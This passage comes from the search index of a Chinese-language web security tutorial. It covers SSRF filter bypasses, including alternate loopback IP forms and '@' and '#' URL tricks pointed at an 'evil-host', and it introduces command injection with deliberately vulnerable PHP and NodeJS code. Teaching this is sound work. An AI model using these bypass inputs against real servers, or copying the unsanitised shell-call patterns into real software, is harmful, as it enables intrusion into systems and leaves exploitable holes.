\u5730\u5740\u3002\u7531\u4e8e\u540e\u7aef\u7cfb\u7edf\u901a\u5e38\u53d7\u5230\u7f51\u7edc\u62d3\u6251\u7684\u4fdd\u62a4\uff0c\u56e0\u6b64\u5b83\u4eec\u901a\u5e38\u5177\u6709\u8f83\u5f31\u7684\u5b89\u5168\u6001\u52bf\u3002\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u5185\u90e8\u540e\u7aef\u7cfb\u7edf\u5305\u542b\u654f\u611f\u529f\u80fd\uff0c\u4efb\u4f55\u80fd\u591f\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u4eba\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u5373\u53ef\u8bbf\u95ee\u8fd9\u4e9b\u529f\u80fd\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#_4","title":"\u7ed5\u8fc7\u624b\u6bb5","text":"<p>\u901a\u5e38\u4f1a\u770b\u5230\u5305\u542b SSRF \u884c\u4e3a\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee5\u53ca\u65e8\u5728\u9632\u6b62\u6076\u610f\u5229\u7528\u7684\u9632\u5fa1\u63aa\u65bd\u3002\u901a\u5e38\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e9b\u9632\u5fa1\u63aa\u65bd\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_4","title":"\u5e26\u6709\u57fa\u4e8e\u9ed1\u540d\u5355\u7684\u8f93\u5165\u8fc7\u6ee4\u5668\u7684 SSRF","text":"<p>\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u4f1a\u963b\u6b62\u5305\u542b\u8bf8\u5982<code>127.0.0.1</code>and\u4e4b\u7c7b\u7684\u4e3b\u673a\u540d<code>localhost</code>\u6216\u8bf8\u5982<code>/admin</code>. \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u60a8\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u6280\u672f\u7ed5\u8fc7\u8fc7\u6ee4\u5668\uff1a</p> <ul> <li> <p>\u4f7f\u7528 \u7684\u66ff\u4ee3 IP \u8868\u793a<code>127.0.0.1</code>\uff0c\u4f8b\u5982<code>2130706433</code>\u3001<code>017700000001</code>\u6216<code>127.1</code>\u3002</p> </li> <li> <p>\u6ce8\u518c\u60a8\u81ea\u5df1\u7684\u89e3\u6790\u4e3a<code>127.0.0.1</code>. \u60a8\u53ef\u4ee5<code>spoofed.burpcollaborator.net</code>\u7528\u4e8e\u6b64\u76ee\u7684\u3002</p> </li> <li> <p>\u4f7f\u7528 URL \u7f16\u7801\u6216\u5927\u5c0f\u5199\u53d8\u4f53\u6df7\u6dc6\u88ab\u963b\u6b62\u7684\u5b57\u7b26\u4e32\u3002</p> </li> </ul>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_5","title":"\u5e26\u6709\u57fa\u4e8e\u767d\u540d\u5355\u7684\u8f93\u5165\u8fc7\u6ee4\u5668\u7684 SSRF","text":"<p>\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ea\u5141\u8bb8\u5339\u914d\u3001\u4ee5\u6216\u5305\u542b\u5141\u8bb8\u503c\u7684\u767d\u540d\u5355\u7684\u8f93\u5165\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u60a8\u6709\u65f6\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 URL \u89e3\u6790\u4e2d\u7684\u4e0d\u4e00\u81f4\u6765\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u3002</p> <p>URL \u89c4\u8303\u5305\u542b\u8bb8\u591a\u5728\u5b9e\u73b0 URL \u7684\u5373\u5e2d\u89e3\u6790\u548c\u9a8c\u8bc1\u65f6\u5bb9\u6613\u88ab\u5ffd\u89c6\u7684\u7279\u6027\uff1a</p> <ul> <li><code>@</code>\u60a8\u53ef\u4ee5\u4f7f\u7528\u8be5\u5b57\u7b26 \u5728\u4e3b\u673a\u540d\u4e4b\u524d\u7684 URL \u4e2d\u5d4c\u5165\u51ed\u636e\u3002\u4f8b\u5982\uff1a</li> </ul> <p><code>https://expected-host@evil-host</code></p> <ul> <li>\u60a8\u53ef\u4ee5\u4f7f\u7528\u8be5<code>#</code>\u5b57\u7b26\u6765\u6307\u793a URL \u7247\u6bb5\u3002\u4f8b\u5982\uff1a</li> </ul> <p><code>https://evil-host#expected-host</code></p> <ul> <li>\u60a8\u53ef\u4ee5\u5229\u7528 DNS \u547d\u540d\u5c42\u6b21\u7ed3\u6784\u5c06\u6240\u9700\u7684\u8f93\u5165\u653e\u5165\u60a8\u63a7\u5236\u7684\u5b8c\u5168\u9650\u5b9a\u7684 DNS \u540d\u79f0\u4e2d\u3002\u4f8b\u5982\uff1a</li> </ul> <p><code>https://expected-host.evil-host</code></p> <ul> <li> <p>\u60a8\u53ef\u4ee5\u5bf9\u5b57\u7b26\u8fdb\u884c URL \u7f16\u7801\u4ee5\u6df7\u6dc6 URL \u89e3\u6790\u4ee3\u7801\u3002\u5982\u679c\u5b9e\u73b0\u8fc7\u6ee4\u5668\u7684\u4ee3\u7801\u5904\u7406 URL \u7f16\u7801\u5b57\u7b26\u7684\u65b9\u5f0f\u4e0d\u540c\u4e8e\u6267\u884c\u540e\u7aef HTTP \u8bf7\u6c42\u7684\u4ee3\u7801\uff0c\u8fd9\u5c06\u7279\u522b\u6709\u7528\u3002</p> </li> <li> <p>\u60a8\u53ef\u4ee5\u4e00\u8d77\u4f7f\u7528\u8fd9\u4e9b\u6280\u672f\u7684\u7ec4\u5408\u3002</p> </li> </ul>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_6","title":"\u76f2 SSRF \u6f0f\u6d1e","text":"<p>\u5f53\u53ef\u4ee5\u8bf1\u5bfc\u5e94\u7528\u7a0b\u5e8f\u5411\u63d0\u4f9b\u7684 URL \u53d1\u51fa\u540e\u7aef HTTP \u8bf7\u6c42\uff0c\u4f46\u540e\u7aef\u8bf7\u6c42\u7684\u54cd\u5e94\u672a\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u524d\u7aef\u54cd\u5e94\u4e2d\u8fd4\u56de\u65f6\uff0c\u5c31\u4f1a\u51fa\u73b0\u76f2 SSRF \u6f0f\u6d1e\u3002</p> <p>\u76f2 SSRF \u901a\u5e38\u66f4\u96be\u5229\u7528\uff0c\u4f46\u6709\u65f6\u4f1a\u5bfc\u81f4\u5728\u670d\u52a1\u5668\u6216\u5176\u4ed6\u540e\u7aef\u7ec4\u4ef6\u4e0a\u5b8c\u5168\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#ssrf_7","title":"\u4e3a SSRF \u6f0f\u6d1e\u5bfb\u627e\u9690\u85cf\u7684\u653b\u51fb\u9762","text":"<p>\u8bb8\u591a\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\u76f8\u5bf9\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u7684\u6b63\u5e38\u6d41\u91cf\u6d89\u53ca\u5305\u542b\u5b8c\u6574 URL \u7684\u8bf7\u6c42\u53c2\u6570\u3002SSRF \u7684\u5176\u4ed6\u793a\u4f8b\u66f4\u96be\u627e\u5230\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#url","title":"\u8bf7\u6c42\u4e2d\u7684\u90e8\u5206 URL","text":"<p>\u6709\u65f6\uff0c\u5e94\u7528\u7a0b\u5e8f\u4ec5\u5c06\u4e3b\u673a\u540d\u6216 URL \u8def\u5f84\u7684\u4e00\u90e8\u5206\u653e\u5165\u8bf7\u6c42\u53c2\u6570\u4e2d\u3002\u7136\u540e\uff0c\u63d0\u4ea4\u7684\u503c\u4f1a\u5728\u670d\u52a1\u5668\u7aef\u5408\u5e76\u5230\u8bf7\u6c42\u7684\u5b8c\u6574 URL \u4e2d\u3002\u5982\u679c\u8be5\u503c\u5f88\u5bb9\u6613\u88ab\u8bc6\u522b\u4e3a\u4e3b\u673a\u540d\u6216 URL \u8def\u5f84\uff0c\u90a3\u4e48\u6f5c\u5728\u7684\u653b\u51fb\u9762\u53ef\u80fd\u5f88\u660e\u663e\u3002\u4f46\u662f\uff0c\u4f5c\u4e3a\u5b8c\u6574 SSRF \u7684\u53ef\u5229\u7528\u6027\u53ef\u80fd\u4f1a\u53d7\u5230\u9650\u5236\uff0c\u56e0\u4e3a\u60a8\u65e0\u6cd5\u63a7\u5236\u6240\u8bf7\u6c42\u7684\u6574\u4e2a URL\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#url_1","title":"\u6570\u636e\u683c\u5f0f\u4e2d\u7684 URL","text":"<p>\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u4ee5\u5176\u89c4\u8303\u5141\u8bb8\u5305\u542b\u53ef\u80fd\u7531\u6570\u636e\u89e3\u6790\u5668\u8bf7\u6c42\u7684\u683c\u5f0f\u7684 URL \u7684\u683c\u5f0f\u4f20\u8f93\u6570\u636e\u3002\u4e00\u4e2a\u660e\u663e\u7684\u4f8b\u5b50\u662f XML \u6570\u636e\u683c\u5f0f\uff0c\u5b83\u5df2\u5e7f\u6cdb\u7528\u4e8e Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u7528\u4e8e\u5c06\u7ed3\u6784\u5316\u6570\u636e\u4ece\u5ba2\u6237\u7aef\u4f20\u8f93\u5230\u670d\u52a1\u5668\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u63a5\u53d7 XML \u683c\u5f0f\u7684\u6570\u636e\u5e76\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u65f6\uff0c\u5b83\u53ef\u80fd\u5bb9\u6613\u53d7\u5230XXE \u6ce8\u5165\u7684\u653b\u51fb\uff0c\u8fdb\u800c\u5bb9\u6613\u53d7\u5230 XXE \u7684 SSRF \u653b\u51fb\u3002\u5f53\u6211\u4eec\u67e5\u770bXXE \u6ce8\u5165\u6f0f\u6d1e\u65f6\uff0c\u6211\u4eec\u5c06\u66f4\u8be6\u7ec6\u5730\u4ecb\u7ecd\u8fd9\u4e00\u70b9\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/SSRF/SSRF/#refererssrf","title":"\u901a\u8fc7Referer\u5934\u7684SSRF","text":"<p>\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8ddf\u8e2a\u8bbf\u95ee\u8005\u7684\u670d\u52a1\u5668\u7aef\u5206\u6790\u8f6f\u4ef6\u3002\u8be5\u8f6f\u4ef6\u7ecf\u5e38\u5728\u8bf7\u6c42\u4e2d\u8bb0\u5f55 Referer \u6807\u5934\uff0c\u56e0\u4e3a\u8fd9\u5bf9\u4e8e\u8ddf\u8e2a\u4f20\u5165\u94fe\u63a5\u7279\u522b\u6709\u7528\u3002\u901a\u5e38\uff0c\u5206\u6790\u8f6f\u4ef6\u5b9e\u9645\u4e0a\u4f1a\u8bbf\u95ee\u51fa\u73b0\u5728 Referer \u6807\u5934\u4e2d\u7684\u4efb\u4f55\u7b2c\u4e09\u65b9 URL\u3002\u8fd9\u901a\u5e38\u7528\u4e8e\u5206\u6790\u5f15\u7528\u7ad9\u70b9\u7684\u5185\u5bb9\uff0c\u5305\u62ec\u4f20\u5165\u94fe\u63a5\u4e2d\u4f7f\u7528\u7684\u951a\u6587\u672c\u3002\u56e0\u6b64\uff0cReferer \u6807\u5934\u901a\u5e38\u4ee3\u8868 SSRF \u6f0f\u6d1e\u7684\u6709\u6548\u653b\u51fb\u9762\u3002\u6709\u5173\u6d89\u53ca Referer \u6807\u5934\u7684\u6f0f\u6d1e\u793a\u4f8b\uff0c\u8bf7\u53c2\u9605\u76f2 SSRF \u6f0f\u6d1e\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/","title":"\u547d\u4ee4\u6ce8\u5165\u7b80\u4ecb","text":"<p>\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u662f\u6700\u4e25\u91cd\u7684\u6f0f\u6d1e\u7c7b\u578b\u4e4b\u4e00\u3002\u5b83\u5141\u8bb8\u6211\u4eec\u76f4\u63a5\u5728\u540e\u7aef\u6258\u7ba1\u670d\u52a1\u5668\u4e0a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5371\u53ca\u6574\u4e2a\u7f51\u7edc\u3002\u5982\u679c Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7528\u6237\u63a7\u5236\u7684\u8f93\u5165\u5728\u540e\u7aef\u670d\u52a1\u5668\u4e0a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u4ee5\u68c0\u7d22\u5e76\u8fd4\u56de\u7279\u5b9a\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u6ce8\u5165\u6076\u610f payload \u6765\u7834\u574f\u9884\u671f\u547d\u4ee4\u5e76\u6267\u884c\u6211\u4eec\u7684\u547d\u4ee4\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_1","title":"\u4ec0\u4e48\u662f\u6ce8\u5165\u6f0f\u6d1e","text":"<p>\u6ce8\u5165\u6f0f\u6d1e\u88ab\u8ba4\u4e3a\u662f OWASP \u7684\u524d 10 \u5927 Web \u5e94\u7528\u7a0b\u5e8f\u98ce\u9669\u4e2d\u7684\u7b2c 3 \u4f4d\u98ce\u9669\uff0c\u56e0\u4e3a\u5b83\u4eec\u5177\u6709\u5f88\u9ad8\u7684\u5f71\u54cd\u529b\u548c\u5b83\u4eec\u7684\u666e\u904d\u6027\u3002\u5f53\u7528\u6237\u63a7\u5236\u7684\u8f93\u5165\u88ab\u8bef\u89e3\u4e3a\u6b63\u5728\u6267\u884c\u7684 Web \u67e5\u8be2\u6216\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u6ce8\u5165\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5c06\u67e5\u8be2\u7684\u9884\u671f\u7ed3\u679c\u98a0\u8986\u4e3a\u5bf9\u653b\u51fb\u8005\u6709\u7528\u7684\u4e0d\u540c\u7ed3\u679c\u3002</p> <p>Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u79cd\u6ce8\u5165\u7c7b\u578b\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6b63\u5728\u6267\u884c\u7684 Web \u67e5\u8be2\u7684\u7c7b\u578b\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u6700\u5e38\u89c1\u7684\u6ce8\u5c04\u7c7b\u578b\uff1a</p> \u6ce8\u5165 \u63cf\u8ff0 \u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165 \u5f53\u7528\u6237\u8f93\u5165\u76f4\u63a5\u7528\u4f5c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u7684\u4e00\u90e8\u5206\u65f6\u53d1\u751f \u4ee3\u7801\u6ce8\u5165 \u5f53\u7528\u6237\u8f93\u5165\u76f4\u63a5\u5728\u8ba1\u7b97\u4ee3\u7801\u7684\u51fd\u6570\u5185\u65f6\u53d1\u751f SQL\u6ce8\u5165 \u5f53\u7528\u6237\u8f93\u5165\u76f4\u63a5\u7528\u4f5c SQL \u67e5\u8be2\u7684\u4e00\u90e8\u5206\u65f6\u53d1\u751f \u8de8\u7ad9\u70b9\u811a\u672c/HTML \u6ce8\u5165 \u5728\u7f51\u9875\u4e0a\u663e\u793a\u51c6\u786e\u7684\u7528\u6237\u8f93\u5165\u65f6\u53d1\u751f <p>\u9664\u4e86\u4e0a\u8ff0\u4e4b\u5916\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u7c7b\u578b\u7684\u6ce8\u5c04\uff0c\u4f8b\u5982<code>LDAP injection</code>,\u00a0<code>NoSQL Injection</code>,\u00a0<code>HTTP Header Injection</code>,\u00a0<code>XPath Injection</code>,\u00a0<code>IMAP Injection</code>,\u00a0<code>ORM Injection</code> \u548c\u5176\u4ed6\u3002\u6bcf\u5f53\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528\u7528\u6237\u8f93\u5165\u800c\u672a\u7ecf\u8fc7\u9002\u5f53\u8fc7\u6ee4\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u5c06\u7528\u6237\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u8fb9\u754c\u8f6c\u4e49\u5230\u7236\u67e5\u8be2\u5e76\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u4ee5\u66f4\u6539\u5176\u9884\u671f\u76ee\u7684\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u968f\u7740\u8d8a\u6765\u8d8a\u591a\u7684 Web \u6280\u672f\u88ab\u5f15\u5165\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u5c06\u770b\u5230\u65b0\u7c7b\u578b\u7684\u6ce8\u5165\u88ab\u5f15\u5165\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_2","title":"\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165","text":"<p>\u5f53\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u65f6\uff0c\u6211\u4eec\u63a7\u5236\u7684\u7528\u6237\u8f93\u5165\u5fc5\u987b\u76f4\u63a5\u6216\u95f4\u63a5\u8fdb\u5165\uff08\u6216\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5f71\u54cd\uff09\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684 Web \u67e5\u8be2\u3002\u6240\u6709\u7f51\u7edc\u7f16\u7a0b\u8bed\u8a00\u90fd\u6709\u4e0d\u540c\u7684\u529f\u80fd\uff0c\u4f7f\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u76f4\u63a5\u5728\u540e\u7aef\u670d\u52a1\u5668\u4e0a\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002\u8fd9\u53ef\u4ee5\u7528\u4e8e\u5404\u79cd\u76ee\u7684\uff0c\u4f8b\u5982\u5b89\u88c5\u63d2\u4ef6\u6216\u6267\u884c\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#php","title":"PHP \u793a\u4f8b","text":"<p>\u4f8b\u5982\uff0c\u7528 \u7f16\u5199\u7684 Web \u5e94\u7528\u7a0b\u5e8f<code>PHP</code>\u53ef\u80fd\u4f1a\u4f7f\u7528<code>exec</code>\u3001<code>system</code>\u3001<code>shell_exec</code>\u3001<code>passthru</code>\u6216<code>popen</code>\u51fd\u6570\u76f4\u63a5\u5728\u540e\u7aef\u670d\u52a1\u5668\u4e0a\u6267\u884c\u547d\u4ee4\uff0c\u6bcf\u4e2a\u90fd\u6709\u7a0d\u5fae\u4e0d\u540c\u7684\u7528\u4f8b\u3002\u4ee5\u4e0b\u4ee3\u7801\u662f\u6613\u53d7\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u7684 PHP \u4ee3\u7801\u793a\u4f8b\uff1a</p> <pre><code>&lt;?php\nif (isset($_GET['filename'])) {\n    system(\"touch /tmp/\" . $_GET['filename'] . \".pdf\");\n}\n?&gt;\n</code></pre> <p>\u4e5f\u8bb8\u7279\u5b9a\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u5141\u8bb8\u7528\u6237\u521b\u5efa\u65b0\u7684 <code>.pdf</code> \u6587\u6863\u7684\u529f\u80fd\uff0c\u8be5\u6587\u6863\u5728 <code>/tmp</code> \u76ee\u5f55\u4e2d\u521b\u5efa\uff0c\u6587\u4ef6\u540d\u7531\u7528\u6237\u63d0\u4f9b\uff0c\u7136\u540e\u53ef\u4ee5\u7531 Web \u5e94\u7528\u7a0b\u5e8f\u7528\u4e8e\u6587\u6863\u5904\u7406\u76ee\u7684\u3002\u7136\u800c\uff0c\u7531\u4e8e <code>GET</code> \u8bf7\u6c42\u4e2d <code>filename</code> \u53c2\u6570\u7684\u7528\u6237\u8f93\u5165\u76f4\u63a5\u4e0e <code>touch</code> \u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\uff08\u6ca1\u6709\u5148\u8fdb\u884c\u6e05\u7406\u6216\u8f6c\u4e49\uff09\uff0c\u56e0\u6b64 Web \u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u7684\u653b\u51fb\u3002\u8be5\u6f0f\u6d1e\u53ef\u88ab\u5229\u7528\u5728\u540e\u7aef\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#nodejs","title":"NodeJS \u793a\u4f8b","text":"<p>\u8fd9\u4e0d\u4ec5\u662f <code>PHP</code> \u72ec\u6709\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u51fa\u73b0\u5728\u4efb\u4f55 Web \u5f00\u53d1\u6846\u67b6\u6216\u8bed\u8a00\u4e2d\u3002\u4f8b\u5982\uff0c\u5982\u679c Web \u5e94\u7528\u7a0b\u5e8f\u662f\u5728 <code>NodeJS</code> \u4e2d\u5f00\u53d1\u7684\uff0c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u51fa\u4e8e\u76f8\u540c\u76ee\u7684\u4f7f\u7528 <code>child_process.exec</code> \u6216 <code>child_process.spawn</code>\u3002\u4ee5\u4e0b\u793a\u4f8b\u6267\u884c\u4e0e\u6211\u4eec\u4e0a\u9762\u8ba8\u8bba\u7684\u7c7b\u4f3c\u7684\u529f\u80fd\uff1a</p> <pre><code>app.get(\"/createfile\", function(req, res){\n    child_process.exec(`touch /tmp/${req.query.filename}.txt`);\n})\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4e5f\u5bb9\u6613\u53d7\u5230\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u7684\u5f71\u54cd\uff0c\u56e0\u4e3a\u5b83\u4f7f\u7528 <code>GET</code> \u8bf7\u6c42\u4e2d\u7684 <code>filename</code> \u53c2\u6570\u4f5c\u4e3a\u547d\u4ee4\u7684\u4e00\u90e8\u5206\uff0c\u800c\u6ca1\u6709\u5148\u5bf9\u5176\u8fdb\u884c\u6e05\u7406\u3002\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u547d\u4ee4\u6ce8\u5165\u65b9\u6cd5\u6765\u5229\u7528 <code>PHP</code> \u548c <code>NodeJS</code> Web \u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u540c\u6837\uff0c\u5176\u4ed6 Web \u5f00\u53d1\u7f16\u7a0b\u8bed\u8a00\u5177\u6709\u7528\u4e8e\u76f8\u540c\u76ee\u7684\u7684\u7c7b\u4f3c\u529f\u80fd\uff0c\u5982\u679c\u5b58\u5728\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7f\u7528\u76f8\u540c\u7684\u547d\u4ee4\u6ce8\u5165\u65b9\u6cd5\u52a0\u4ee5\u5229\u7528\u3002\u6b64\u5916\uff0c\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u5e76\u975e Web \u5e94\u7528\u7a0b\u5e8f\u6240\u72ec\u6709\uff0c\u5982\u679c\u5b83\u4eec\u5c06\u672a\u7ecf\u8fc7\u6ee4\u7684\u7528\u6237\u8f93\u5165\u4f20\u9012\u7ed9\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u51fd\u6570\uff0c\u4e5f\u4f1a\u5f71\u54cd\u5176\u4ed6\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u80d6\u5ba2\u6237\u7aef\uff0c\u540c\u6837\u7684\u547d\u4ee4\u6ce8\u5165\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\u3002</p> <p>\u4ee5\u4e0b\u90e8\u5206\u5c06\u8ba8\u8bba\u68c0\u6d4b\u548c\u5229\u7528 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u7684\u4e0d\u540c\u65b9\u6cd5\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#exploitation","title":"Exploitation","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_3","title":"\u68c0\u6d4b","text":"<p>\u68c0\u6d4b\u57fa\u672c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e0e\u5229\u7528\u6b64\u7c7b\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u76f8\u540c\u3002\u6211\u4eec\u5c1d\u8bd5\u901a\u8fc7\u5404\u79cd\u6ce8\u5165\u65b9\u6cd5\u9644\u52a0\u6211\u4eec\u7684\u547d\u4ee4\u3002\u5982\u679c\u547d\u4ee4\u8f93\u51fa\u4e0e\u9884\u671f\u7684\u901a\u5e38\u7ed3\u679c\u4e0d\u540c\uff0c\u5219\u6211\u4eec\u5df2\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\u3002\u5bf9\u4e8e\u66f4\u9ad8\u7ea7\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\uff0c\u60c5\u51b5\u53ef\u80fd\u5e76\u975e\u5982\u6b64\uff0c\u56e0\u4e3a\u6211\u4eec\u53ef\u80fd\u4f1a\u5229\u7528\u5404\u79cd\u6a21\u7cca\u6d4b\u8bd5\u65b9\u6cd5\u6216\u4ee3\u7801\u5ba1\u67e5\u6765\u8bc6\u522b\u6f5c\u5728\u7684\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u9010\u6b65\u6784\u5efa\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\uff0c\u76f4\u5230\u6211\u4eec\u5b9e\u73b0\u547d\u4ee4\u6ce8\u5165\u3002\u8be5\u6a21\u5757\u5c06\u4e13\u6ce8\u4e8e\u57fa\u672c\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u6211\u4eec\u63a7\u5236\u76f4\u63a5\u7528\u4e8e\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u529f\u80fd\u7684\u7528\u6237\u8f93\u5165\uff0c\u800c\u4e0d\u8fdb\u884c\u4efb\u4f55\u6e05\u7406\u3002</p> <p>\u4e3a\u4e86\u8bc1\u660e\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u5c06\u4f7f\u7528\u672c\u8282\u672b\u5c3e\u7684\u7ec3\u4e60\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_4","title":"\u547d\u4ee4\u6ce8\u5165\u68c0\u6d4b","text":"<p>\u5f53\u6211\u4eec\u5728\u4e0b\u9762\u7684\u7ec3\u4e60\u4e2d\u8bbf\u95ee Web \u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u4e00\u4e2a <code>Host Checker</code> \u5b9e\u7528\u7a0b\u5e8f\uff0c\u5b83\u4f3c\u4e4e\u8981\u6c42\u6211\u4eec\u63d0\u4f9b IP \u4ee5\u68c0\u67e5\u5b83\u662f\u5426\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff1a</p> <p>![[Pasted image 20221210223151.png]]</p> <p>\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u8f93\u5165\u672c\u5730\u4e3b\u673a IP <code>127.0.0.1</code> 